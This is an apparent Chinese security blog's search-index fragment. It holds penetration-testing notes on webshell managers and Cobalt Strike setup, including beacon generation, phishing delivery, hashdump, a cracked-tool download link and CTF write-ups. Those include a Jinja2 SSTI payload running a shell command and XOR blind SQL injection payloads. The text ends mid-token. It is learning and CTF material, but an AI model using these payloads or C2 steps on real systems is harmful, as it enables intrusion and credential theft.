c192da894a37268361463ef83c34bc505adfbb25ed0bbd9a302448263ea56edce06b08a75b381aa730930c81fa10edb385a44f0632b730cae96b1bbe21f34b0a19899af36e8fbcbf6d7f0560ab253e7bcd9b5018f2e9b93641f92ed1f98eb20fcec86f746d35cc1970554ee26d7adeb034f1ca0518efbf2ac671e9c01d04365dea3337b92253248e78eafcc91177c919f0a69befd425fbd33b7e2f7c9fffc12845d491c9bca6e83dd4a0bd00d07d40252e10e94a4cee9ff60ab60d52dfbcccef7a05192b6be44103b99c724da2b32362a9161cc4d77af553af6e844bcd5b277d3e731465492b6592f4c499ad9291d7a76de2746161952d68f4f03affe12071640a602da99534f880db76c9a5adbb34f40698059b71681ab691bb9a26f3cba5cf47a5b7c789d578e28db0901e45d9b73117f49c4505f2e93ee85c61add3e5b8fdc6ac124bd5626bde5ddc2c2ea2edf5364485fc020aacd3c5ecb549238d2cafdc9388e04be259178314e6cebd46e60dc0981fe789af11f7e52fbc078a140ba36755083a606d0652f0c0a74e01c4287cc49a10f8a6cd10dd0718b983382ef3cae9295a7bfc36ce31e5c185659c6b0a89e0044945d7ee5dac602cc3fcf5ec27c228d3481abd665178722049cbe9fab6552d4ca8117f0c7367a7f65fdaf4414463c1be1246c3109f81c4f6aaafe8ccf3d9d2c1f661f3e6e94bc36c11933030070af4b2a10ce69bb96821872c9404c6cd0bff63ac65ef4ea78130283625f3c4060eab65c24e9c17b397b03bcb19ea39509f404c84d520ab653704408962510206a77e0eaaca817adc31590a3413827855aca26019a0e12143d84022a4ff9a681a2d0002af8c850847c46b84277a9afedca50fc90e3dcff0fb8d5b0a8b0f0f9c6191d07d94dfdd0ee3e7e9778b3cf991e6b8e44ea0b5d47c11691019e86362fc309d79b674b2232bda9fc0315f6fe8bfb0d983b36ee772a7bb51cc5f1ae1e08393a1d5ea7611e9c3dbd19e27aaca4944b203f9878d7d89d31a3450cfa249954c566831c74f861c867dff8679ce815cb14d95c7a08215cb144d0728c2d0e50133ec3288c78cc3ebe8ba6ee0eaab3d7612d8c18f8fcb917eaf09ce128f791ba7688ce309070f810562ce623b5d0f3e36ac43caf5e31bfaa132ec17a30ca758279da15e7daaf43f836d458966139299a62c5ea483207c95a5abf14001dfc1da8267457ea211b7fcfac339ef4be76444fc3d27266e65580cf565bfe2d2df2165098385f95a7dd72fbb1b72e97c6b716b217a84bc34b38d168177f94ab4b0bb9a4af7f39cbdf7a7f41f5671e2a11c7600c7e3029fabe796753a3f9a4d113d7e0042187b5095f3a3f46f099dcc19fc6feffc92a4b9f3a953007173ef931157d13558ea8973b0245ba21807398d54c820f4813dfea138b2c3d1e52762d470fd53bfc291fb119d7d3627f103cd62864d46565569340a60e200d82e080f4293f551fd9322e2fb150fb2b1a36643d3fb6cfe520bcbaa94f4c2854a2ebe8418984b36d7818bf96c9c7db1185003f02e7d313decd1e7c908aefe54a022d4ab1905a9da32a00145d0457abc61fc8a9b5df6d47758ea6f9687583920991047d989a7e18d9a0b0ce2a32cbeda77be6518f07dd96cd23e56e3ce90590032b4a15436cf4506f3bf2c47c4b24a3fd30a4aadf1103d26c3bb19c619e6387c9367ab9345bb8af34de5e949e92a08a5db3ce5b692ff5f45dd0f35e9169e8d435d44e7237d146ea672896d5ee8d12acc49ec5fc3b522620407c410fac62595c5133b71444cff6eb3b019dde381fb634c1e226a0d376d982d50a0ff813f4c247619aaac2457dbbf441213625d7ba7986cc976aa3b92bdf8120720482898a3ec9f3efe1ff0f6e03adb7e33017ea985bf172deab36097b092393be7aaa1094d5711ac44a96ae56a3ed634842e69bab307c56f77eaab0d6a8214b0e326afb7b03f9a1b7321dc1963d1dff41dca5c5d3aeafbca45eb8ab5ba6116ced8c0aac813fbb8c69b7733ac622d1c7aeb30db1c0a298e41dee59b66f73f64d90ace7d132af9eff6d78e38a786f696a0d72ac32259527db597ad89cb0dc05cb77875039354a37df52d848aaf63043a9d65f326f80990921c03be5ea1a4e0ca3c6a0619ee36f8661dfb95cdc0081a68689a0911b2a5a297fd96c7024df463101bbaa8a4276315c98a6dd13b96d804be471499b55a9a94ad2bd5e8cb1ea15fe1036fdeb427f1d6a1795344e736595d6410acbf8656a2a3fad002e41e88aee6206c0ccd6237bdf83866aaf380031255e74760b8096ba6655bd5b432e77118f1fcb4e58e8830b2d5367c89201df1b726beddf35d00d3ecdb9b20e5e7c5c74919a8decb598549b73fa63dbe635b891dc0ca24f6cec108c26d5e8af1876f5fa300713bb8eff8a1903ec725bd2ad1ca610764f51490ae79b73677f445e388f7ac4a380cb243177d8bc35971fb20e2bdaab1ec045a6eb6a0cb000a111a529401dd268d3fe20f79766194583355501f1d279d156293b4d983d4973ee85a65b8d69fede405f9b78aafcfe33675b343e24d9a1ac25fb10dee7c29b77a51e2732f899b841e9cfd2d83e7fff1c8dc996bd02eeb67c3ba3fe4180b883f75b648bb69018b2dc89040d24c0242852103f24e4c8143a413c402bd382347b4a946766b5d10c551b7ebc6c95521f1b46b049daf6c4b7f561b846e022c5d510bfbacc49896a9ff8e4c916bcb0b1b71486f91b7c598672cc933a5e09cb201930ecd1ed0269f6ee155b3dd0dcb1da9b3c40d60970b00122713f1eac56b66593907792d26eb1a022676017f4743a0dbff1a03b664ea1938a4015bf95</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="冰蝎Shell管理工具"><a href="#冰蝎Shell管理工具" class="headerlink" title="冰蝎Shell管理工具"></a>冰蝎Shell管理工具</h2><h3 id="引用内容，与冰蝎的基本使用和原理"><a href="#引用内容，与冰蝎的基本使用和原理" class="headerlink" title="引用内容，与冰蝎的基本使用和原理"></a>引用内容，与冰蝎的基本使用和原理</h3><p><a href="https://www.anquanke.com/post/id/212271">冰蝎，从入门到魔改</a></p><p><a href="https://github.com/rebeyond/Behinder">官方给出的ReadMe文档</a></p><h3 id="使用方式，与冰蝎的优势和特征"><a href="#使用方式，与冰蝎的优势和特征" class="headerlink" title="使用方式，与冰蝎的优势和特征"></a>使用方式，与冰蝎的优势和特征</h3><p>因为从前的”菜刀”的流量很容易被各种工具检测到，才有了这个第二代的Shell管理工具，冰蝎是基于流量加密的Shell管理软件。冰蝎是基于Java的，所以可以跨平台使用。</p><p><strong>主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等</strong></p><p><a href="https://github.com/rebeyond/Behinder/releases">下载GitHub上冰蝎的Release版本</a></p><p>不过需要Jre的版本为1.6-1.8似乎是，我直接运行不了，就主要使用蚁剑来进行Shell管理了。</p><h2 id="蚁剑Shell管理工具"><a href="#蚁剑Shell管理工具" class="headerlink" title="蚁剑Shell管理工具"></a>蚁剑Shell管理工具</h2><p><a href="https://xz.aliyun.com/t/4000">从静态到动态打造一款免杀的antSword(蚁剑)</a></p><p>蚁剑主要使用的是编解码流量内容来进行绕过WAF，只能说与冰蝎各有千秋吧感觉，不好说谁好谁坏。</p><h2 id="哥斯拉Shell管理工具"><a href="#哥斯拉Shell管理工具" class="headerlink" title="哥斯拉Shell管理工具"></a>哥斯拉Shell管理工具</h2><p><a href="https://github.com/BeichenDream/Godzilla/releases/tag/v3.03-godzilla">工具的下载地址</a></p><p>这个听说和冰蝎差不多，emmm，还没用过，用过之后再回来评价。</p><h2 id="Cobalt-Strike的安装与使用总结"><a href="#Cobalt-Strike的安装与使用总结" class="headerlink" title="Cobalt Strike的安装与使用总结"></a>Cobalt Strike的安装与使用总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Cobalt Strike也是一个木马后门的管理工具，但是这个木马管理工具相对于前面所说的几个网马工具功能多了很多了，很酷嘿嘿（众所周知，界面越炫酷，对系统所造成危害也就越大 ::doge:: ）。</p><p>所使用的方法一般就是钓鱼了，直接向被攻击者的邮箱发送一个具有诱惑性的邮件(根据被攻击者的喜好)，被攻击者点击木马之后木马上线成功，攻击者即可远程监控与控制被攻击者的PC。</p><p>但是，CS最重要的还是免杀，不能还没点呢，刚下载下来就被检测出自己的后门属性了，直接被杀还有什么后渗透可言。但是这方面的免杀还是要看二进制能力了，这不是我们主要研究的目标了，我们现在这里只需要了解CS马的简单使用即可。</p><p><a href="https://troyess.com/2021/05/23/%E5%88%9D%E8%AF%86CobaltStrike/">参考徐神的文章，徐神我的超人</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.ddosi.com/cobalt-strike-4-3-fix/">CS4.3的可以下载的地址(徐神强推的一个网站)</a></p><p><a href="https://anonfiles.com/bdQ7Ldtau3/cobaltstrike4.3_www.ddosi.com_rar">国外某网盘的下载链接(内容取自上面的那个网站)</a></p><p>解压密码为:<code>www.ddosi.com</code></p><pre class="line-numbers language-none"><code class="language-none">Linux下启动该工具.&#x2F;start.shsh文件里面的命令为java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar $*Windows下启动该工具直接点击 可执行文件exe即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置安装"><a href="#配置安装" class="headerlink" title="配置安装"></a>配置安装</h3><p>在自己服务器配置服务端，CS的整体架构应该像下面这样吧？</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603131230506.png" alt="image-20210603131230506"></p><p>英格力士高级不高级，嘿嘿。</p><h4 id="安装JDK1-8-0"><a href="#安装JDK1-8-0" class="headerlink" title="安装JDK1.8.0"></a>安装JDK1.8.0</h4><p>先配置部署在云服务器的总服务端吧，首先安装JDK1.8，这里只展示centos安装的jdk1.8，其他的也都挺类似的。网上教程很详细。</p><pre class="line-numbers language-none"><code class="language-none">用yum安装JDK1.查看yum库中都有哪些jdk版本(暂时只发现了openjdk)[root@localhost ~]# yum search java|grep jdkldapjdk-javadoc.x86_64 : Javadoc for ldapjdkjava-1.6.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.6.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.6.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.6.0-openjdk-javadoc.x86_64 : OpenJDK API Documentationjava-1.6.0-openjdk-src.x86_64 : OpenJDK Source Bundlejava-1.7.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.7.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.7.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.7.0-openjdk-javadoc.noarch : OpenJDK API Documentationjava-1.7.0-openjdk-src.x86_64 : OpenJDK Source Bundlejava-1.8.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.8.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.8.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.8.0-openjdk-headless.x86_64 : OpenJDK Runtime Environmentjava-1.8.0-openjdk-javadoc.noarch : OpenJDK API Documentationjava-1.8.0-openjdk-src.x86_64 : OpenJDK Source Bundleldapjdk.x86_64 : The Mozilla LDAP Java SDK2.选择版本,进行安装&#x2F;&#x2F;选择1.7版本进行安装[root@localhost ~]# yum install java-1.8.0-openjdk&#x2F;&#x2F;安装完之后，默认的安装目录是在: &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;3.查看java版本[root@VM-12-8-centos ~]# java -versionopenjdk version &quot;1.8.0_292&quot;OpenJDK Runtime Environment (build 1.8.0_292-b10)OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行teamserver总服务端"><a href="#运行teamserver总服务端" class="headerlink" title="运行teamserver总服务端"></a>运行teamserver总服务端</h4><pre class="line-numbers language-none"><code class="language-none">运行的方式如下chmod +x teamserver.&#x2F;teamserver vps的ip地址 连接口令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603135728701.png" alt="image-20210603135728701"></p><p>记得一定要把所有文件都传到linux里面，我开始没传完，一直报错，md忙了半小时，最后在徐神的帮助下才解决，日了。</p><h4 id="客户端连接服务端"><a href="#客户端连接服务端" class="headerlink" title="客户端连接服务端"></a>客户端连接服务端</h4><p>直接运行那个exe文件即可，里面的内容按刚才你填的内容写，然后IP地址、端口和密码必须跟刚才服务端那里保持一致，而用户名是可以随意设置的，这就是让团队使用的，就像一堆人连一个WiFi一样。</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603141524952.png" alt="image-20210603141524952"></p><p>配置好的界面就像上面的这样，但是全是英语单词沃日，能看懂，但是只能看懂一点点。</p><h3 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h3><p><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129">这里是详细的教程总结处</a></p><p>我这里只写我用到的各种东西(或者说是比较常用的东西)。</p><p><strong>工具栏</strong></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603143946539.png" alt="image-20210603143946539"></p><p>再就是要总结一下使用的流程吧</p><h4 id="生成木马后门"><a href="#生成木马后门" class="headerlink" title="生成木马后门"></a>生成木马后门</h4><p>首先就是创建后门木马程序啦，这一步也是整体的流程的关键一环，称之为最关键的一步也不为过，这一步直接关系到我们的木马能不能上线。这一步中最关键又是其中的免杀，但是免杀还不是我现在能研究的了的。</p><p><strong>如何生成后门木马程序</strong></p><p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了下面的几个Listener</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603144418716.png" alt="image-20210603144418716"></p><p>其中一般化使用的是上面的5个Beacon的payload</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603144755208.png" alt="image-20210603144755208"></p><p>使用TCP连接生成的payload更为简单，直接点击下面的save</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/QQ录屏20210603145725.gif" alt="QQ录屏20210603145725"></p><p>保存后门木马文件到桌面上后，可以到虚拟机里面测试木马的性能。这里开始我用的tcp(但是一开始忘开4444端口了，后来就换成http了，注意<strong>这里的4444端口是你的vps上需要开的端口，用来接收反弹shell的</strong>)，后来发现还是http好用似乎。就直接换成http了，也懒得开虚拟机了，直接在我的物理机上测试算了。</p><p>简单地测试了一下，还是可以用的</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603160232678.png" alt="dump了一下用户密码的hash值"></p><p>hash值都dump下来了，就能在本地直接使用hashcat碰撞用户的密码啦。</p><h4 id="上线后的命令"><a href="#上线后的命令" class="headerlink" title="上线后的命令"></a>上线后的命令</h4><p>下面只记录不会太多，估计只会记录<strong>常见的、炫酷的和有用的</strong>。</p><pre class="line-numbers language-none"><code class="language-none">hashdump   # 把受害者主机的用户名和密码的hash值脏下来screenshot  # 获得受害者PC的正在显示的情况的截图，估计只是模拟按键PrntScr而已<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="桌面截图"><a href="#桌面截图" class="headerlink" title="桌面截图"></a>桌面截图</h5><p><code>screenshot</code></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603161052384.png" alt="生成截图的功能"></p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>可以直接获得受害者主机的目录并且可以上传文件，这就方便了我们后续上传更强力的马、更针对受害者环境的马。</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603222144746.png" alt="可以看到这个jar文件就是我后来通过CS上传到我的虚拟机上的"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CS后门使我们可以后续持续对受害者网络进行攻击，具体再说怎么使用就要到实战中去了，毕竟实战才是提升自己实力的最快的途径。</p><h2 id="Shiro-反序列化综合利用工具"><a href="#Shiro-反序列化综合利用工具" class="headerlink" title="Shiro 反序列化综合利用工具"></a>Shiro 反序列化综合利用工具</h2><p><a href="https://github.com/j1anFen/shiro_attack">工具的下载地址</a>，该工具应该是基于Java的，所以可以跨平台使用。</p><h2 id="sqlmap的简单使用"><a href="#sqlmap的简单使用" class="headerlink" title="sqlmap的简单使用"></a>sqlmap的简单使用</h2><h3 id="POST类型的sql注入"><a href="#POST类型的sql注入" class="headerlink" title="POST类型的sql注入"></a>POST类型的sql注入</h3><p>利用SQLmap进行简单的post类型的注入，因为现在很多的网站都是采用post的方式进行数据传输的，所以这里尝试一下post类型的注入。</p><h4 id="利用sqlmap自动搜索表单的方式"><a href="#利用sqlmap自动搜索表单的方式" class="headerlink" title="利用sqlmap自动搜索表单的方式"></a>利用sqlmap自动搜索表单的方式</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.160.1&#x2F;sqltest&#x2F;post.php&quot; --forms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Java反序列化终极测试工具"><a href="#Java反序列化终极测试工具" class="headerlink" title="Java反序列化终极测试工具"></a>Java反序列化终极测试工具</h2><p>这个主要是java的环境不好搞，因为使用到了某些包只有特定的几个jdk版本中在使用，所以这里使用的jdk版本为<code>jdk-8u151-windows-x64.exe</code>，在国内的<a href="https://repo.huaweicloud.com/java/jdk/8u151-b12/">华为镜像站下载</a></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210719120737197.png" alt></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="在线信息收集"><a href="#在线信息收集" class="headerlink" title="在线信息收集"></a>在线信息收集</h2><p><a href="https://blog.csdn.net/bring_coco/article/details/114485091?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-114485091.pc_agg_rank_aggregation&amp;utm_term=fofa%E7%9A%84%E8%AF%AD%E6%B3%95&amp;spm=1000.2123.3001.4430">fofa语法</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题笔记</title>
      <link href="2021/05/28/CTF/"/>
      <url>2021/05/28/CTF/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    本片文章主要写的内容——CTF领域内我所学到的所有方向的笔记。    </p><p>​    之前的博客环境与内容坏了，内容还在，不过md的内容已经永久遗失了，之后会将所有的关于CTF内容记录到此文件内，笔记的内容尽量不超过20万字，防止读者打开的速度过慢。</p><p>​    之后会将从前写的文章放到百度网盘内备份，并且随着我放到我的VPS内，如果我没vps了就访问如下的GitHub的地址，不过这里面的url确实挺长的，如果你对我从前文章的内容感兴趣的话，请访问<a href="https://github.com/m4xlmum/a16n.github.io/">我从前的博客</a>，但是其实以前的内容也没啥，直接dump下来看好了。往后一定认真写博客，主要的是一定要备份，以前写的好多文章都没了，还是挺心疼的(还好备份还在)</p><ol><li>WEB——网络安全，主要考察一些web安全漏洞，包括SQL注入、xss、xxe、ssti、代码审计、反序列化安全、各种cms的漏洞等。</li><li>MISC——杂项，考察内容覆盖广泛，主要包含隐写术、古典密码学、压缩包、图片、编码、取证等方面。</li><li>REVERSE——逆向工程，主要考察软件破解与软件算法逆向。有时会涉及软件脱壳与动态调试。</li><li>MOBILE——移动安全，类似于逆向工程，主要考察软件破解、算法逆向、脱壳与动态调试。</li><li>CRYPTO——密码学，以”XX学”命名的肯定很难啦，主要方向有古典密码、现代密码，现代密码又可以分为流密码、分组密码、公钥密码等。</li></ol><h1 id="Hack-The-Box"><a href="#Hack-The-Box" class="headerlink" title="Hack The Box"></a>Hack The Box</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>夹杂在众多CTF题目中的多股清流，下面分为WEB、MISC这些类的都是题目比较杂、比较多的平台上的总结。再分几个比较小的平台的写，这是第一个，界面超炫酷的HTB。</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="快速传参-Emdee-five-for-life"><a href="#快速传参-Emdee-five-for-life" class="headerlink" title="快速传参-Emdee five for life"></a>快速传参-Emdee five for life</h3><p><img src="/2021/05/28/CTF/image-20210602225736815.png" alt="image-20210602225736815"></p><p><img src="/2021/05/28/CTF/image-20210602225914557.png" alt="image-20210602225914557"></p><p>第一关太简单了（一看就知道这不就是签到题嘛，靠的就是写脚本，快速传参吧），本来都懒得写了，但是本着做做也无所谓的念头还是写了个简单的脚本来搞</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5url <span class="token operator">=</span> <span class="token string">'http://46.101.33.243:31878/'</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>textres <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>dmd5 <span class="token operator">=</span> res<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'h3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment"># 使用bs4解析网页数据</span>ymd5 <span class="token operator">=</span> md5<span class="token punctuation">(</span>dmd5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>resp2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'hash'</span><span class="token punctuation">:</span> ymd5<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>BeautifulSoup<span class="token punctuation">(</span>resp2<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稍微优化了一下下呀。</p><p><img src="/2021/05/28/CTF/image-20210602232640054.png" alt="炫酷的界面"></p><h3 id="SSTI、Jinja2-Templated"><a href="#SSTI、Jinja2-Templated" class="headerlink" title="SSTI、Jinja2-Templated"></a>SSTI、Jinja2-Templated</h3><pre class="line-numbers language-none"><code class="language-none">Site still under constructionProudly powered by Flask&#x2F;Jinja2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开局给的提示，用的python的flask写的，这很明显的ssti漏洞，而且还是Jinja2的。</p><p>ssti但是没有给注入点提示啊，给个<code>id=1</code>也好啊，这种情况我也么啥好用的工具，只好看看wp，原来直接<code>/&#123;&#123;7+7&#125;&#125;</code>就行了，然后就是Jinja2的专用payload了，一般这些ssti的payload都是相似的，所以总结一下。</p><p><a href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文</a></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&#123;config&#125;&#125;&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>class是本类、mro是父类、subclasses是子类集合，这里的子类是<code>186</code>里面有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>似乎是。</p><p><img src="/2021/05/28/CTF/image-20210602234813169.png" alt="image-20210602234813169"></p><pre class="line-numbers language-none"><code class="language-none">HTB&#123;t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入常用函数与知识点"><a href="#SQL注入常用函数与知识点" class="headerlink" title="SQL注入常用函数与知识点"></a>SQL注入常用函数与知识点</h3><h4 id="字符串提取-substr、mid"><a href="#字符串提取-substr、mid" class="headerlink" title="字符串提取(substr、mid)"></a>字符串提取(substr、mid)</h4><div class="table-container"><table><thead><tr><th>函数名称</th><th>函数使用</th><th>函数功能</th><th>详细链接</th></tr></thead><tbody><tr><td>substr</td><td>substr()</td><td></td><td></td></tr><tr><td>mid</td><td>mid(“text”,1,1)</td><td>返回t，第一个1表示起始位置，第二个1表示截取长度</td><td><a href="https://www.w3school.com.cn/sql/sql_func_mid.asp">MID使用</a></td></tr></tbody></table></div><p><img src="/2021/05/28/CTF/image-20210601161051184.png" alt="mid方法"></p><h3 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入就是在一个地方进行数据库插入，另一个地方进行数据库数据的取出，插入时可能对注入进行了过滤啥的，但是取出的时候没进行过滤，就能执行我们想要插入的恶意代码了。</p><p>但是这个注入的断定是比较难的，因为要对两个不同的位置进行联合测试，应该是所有注入类型中最难找到的了，实战中我们往往会错过这类注入点。</p><p>这类注入点没有特定的payload，往往与下面的各种注入类型交叉使用。</p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>一般分为<code>单引号</code>、<code>双引号</code>的字符型联合注入，和数字型联合注入。</p><p>联合查询注入现在实战应用中已经很少了，这种是没有什么难度的。</p><h4 id="盲注-时间盲注、布尔盲注"><a href="#盲注-时间盲注、布尔盲注" class="headerlink" title="盲注(时间盲注、布尔盲注)"></a>盲注(时间盲注、布尔盲注)</h4><h4 id="异或盲注"><a href="#异或盲注" class="headerlink" title="异或盲注"></a>异或盲注</h4><h4 id="形成原理与payload"><a href="#形成原理与payload" class="headerlink" title="形成原理与payload"></a>形成原理与payload</h4><p><strong>盲注的形成原理都是相同的，不存在返回值，或者只存在对于错的返回值这种，但是我们插入进去的SQL语句又实实在在是起到了作用了的就能使用盲注来进行获取数据信息。</strong></p><p>这里主要再说一下异或盲注的形成原理与payload，异或注入的表现为<code>?id=1^1^1</code>返回的是<code>?id=1</code>的内容、<code>?id=1^0^1</code>返回的是<code>?id=0</code>的内容。这样就能借助SQL里面的一些方法来获取数据库里面的数据信息啦。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不断变换<code>database()</code>处为我们想注入的SQL语句、后面第一个1是第几个字母、后面的32为字母的值。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h4><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="简单介绍与一般payload"><a href="#简单介绍与一般payload" class="headerlink" title="简单介绍与一般payload"></a>简单介绍与一般payload</h5><p>堆叠注入是利用<code>;</code>隔开几个查询语句，使得几个查询语句都可以进行，从而进行SQL注入。危险的SQL语句一般为<code>mysql_multi_query()</code>，因为<code>mysql_multi_query()</code> 支持多条sql语句同时执行，每个SQL语句使用<code>;</code>分隔即可分别执行。</p><p>没有固定的payload一般payload如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token 